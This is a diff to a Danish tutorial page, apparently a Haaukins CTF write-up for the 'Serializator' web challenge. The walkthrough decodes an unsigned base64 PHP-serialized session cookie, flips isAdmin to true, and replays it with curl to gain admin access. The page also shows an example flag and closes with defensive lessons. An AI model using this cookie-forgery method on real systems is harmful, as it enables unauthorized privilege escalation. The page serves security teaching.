@@ -22,17 +22,44 @@
 <div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Hvad går opgaven ud på?</h2>
-<p>En PHP-app lægger session-objektet i en cookie <strong>uden signatur</strong>:</p>
-             <pre><code>base64 -d  ->  O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:0;}</code></pre>
-             <p>Flip <code>b:0</code> → <code>b:1</code>, re-encode, send tilbage:</p>
-             <pre><code>ADMIN=$(printf 'O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}' | base64 -w0)
-curl -b "session=$ADMIN" http://serializator.com/index.php</code></pre>
+<h2>Sporet: hvad fortæller cookien os, hvis vi spørger den?</h2>
+<p>Opgaveteksten er "Visit serializator.com. Login as Admin to reach the goal!" men giver
+ingen admin-credentials. Allerede titlen "Serializator" peger mod serialisering som mekanismen.</p>
+<ol class="steps">
+<li><strong>Log ind med hvad som helst.</strong> Login-formularen accepterer vilkårlige
+credentials.
+<pre><code>curl -i --resolve serializator.com:80:&lt;ip&gt; --data "user=test&amp;password=test"   http://serializator.com/index.php
+# Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO3M6NzoiaXNBZG1pbiI7YjowO30%3D</code></pre>
+At login lykkes med PÅFUNDNE credentials er selv et spor: spærren for admin-adgang ligger ikke i
+login-tjekket, den må ligge i noget der afgøres EFTER login, altså i den session-cookie vi lige
+fik.</li>
+<li><strong>Cookien ligner base64. Afkod den, altid.</strong> Enhver streng af base64-alfabetets
+tegn er værd at prøve at afkode, før man antager den er krypteret.
+<pre><code>echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InRlc3QiO3M6NzoiaXNBZG1pbiI7YjowO30=' | base64 -d
+# O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:0;}</code></pre>
+Læsbar tekst, ikke krypteret. Mønsteret <code>O:len:"Class":n:{...}</code> er PHP's eget
+serialiseringsformat, serveren gemmer simpelthen objektet rå i cookien.</li>
+<li><strong>Feltet der afgør alt står lige der, i klartekst.</strong> <code>isAdmin;b:0</code> er
+et booleansk false. Næste spørgsmål: er der en signatur der forhindrer os i at ændre det? Det
+eneste sikre svar er at prøve.</li>
+<li><strong>Flip værdien, re-encode, send den tilbage.</strong></li>
+</ol>
+<pre><code>ADMIN=$(printf 'O:4:"User":2:{s:8:"username";s:4:"test";s:7:"isAdmin";b:1;}' | base64 -w0)
+curl --resolve serializator.com:80:&lt;ip&gt; -b "session=$ADMIN" http://serializator.com/index.php</code></pre>
+<p>Serveren deserialiserer cookien uden at verificere noget, ser <code>isAdmin=true</code>, og
+giver admin-adgang. Ingen signatur fandtes, fordi ingen blev kontrolleret.</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">HKN{fg-tzn-6bP3Q}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>Usigneret rolle/<code>isAdmin</code> i en cookie = client-side trust; afkod altid cookies.</li><li>PHP-serialize: <code>s:len:"str"</code>, <code>b:0/1</code>, <code>O:len:"Class":n:{...}</code>.</li><li>Var den signeret: søg en PHP object-injection-gadget (<code>__wakeup</code>/<code>__destruct</code>).</li></ul>
+<ul><li><strong>Et login der accepterer vilkårlige credentials er selv et spor.</strong> Hvis adgangskontrollen ikke ligger i login-tjekket, ligger den sandsynligvis i sessionen der sættes efter.</li><li><strong>Afkod altid opaque-udseende tokens/cookies før du antager de er krypteret.</strong> Base64 er en kodning, ikke kryptering, og mange apps bruger den naivt til at gemme rå server-side-objekter client-side.</li><li><strong>Usigneret rolle/isAdmin i en cookie er client-side trust.</strong> Uden en HMAC/signatur kan brugeren selv sætte værdien. PHP-serialize-syntaks: <code>s:len:"str"</code>, <code>b:0/1</code>, <code>O:len:"Class":n:{...}</code>.</li><li><strong>Var cookien signeret, ville dette ikke virke</strong>, men objektet kunne stadig være sårbart via PHP object injection (en <code>__wakeup</code>/<code>__destruct</code>-gadget) hvis man selv kunne kontrollere HVILKEN klasse der deserialiseres.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>"Deserialisér noget klientkontrolleret og stol blindt på felterne" er samme fejl
+uanset sprog: Javas native serialisering, .NET's ViewState, Pythons <code>pickle</code>, og en
+JWT der aldrig får sin signatur verificeret (den klassiske "alg: none"-sårbarhed) er alle
+strukturelt identiske med denne opgave. Når du ser en opaque token/cookie i en app, er det første
+spørgsmål altid: hvad sker der hvis jeg afkoder og ændrer den, accepterer serveren det uden at
+tjekke en signatur?</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
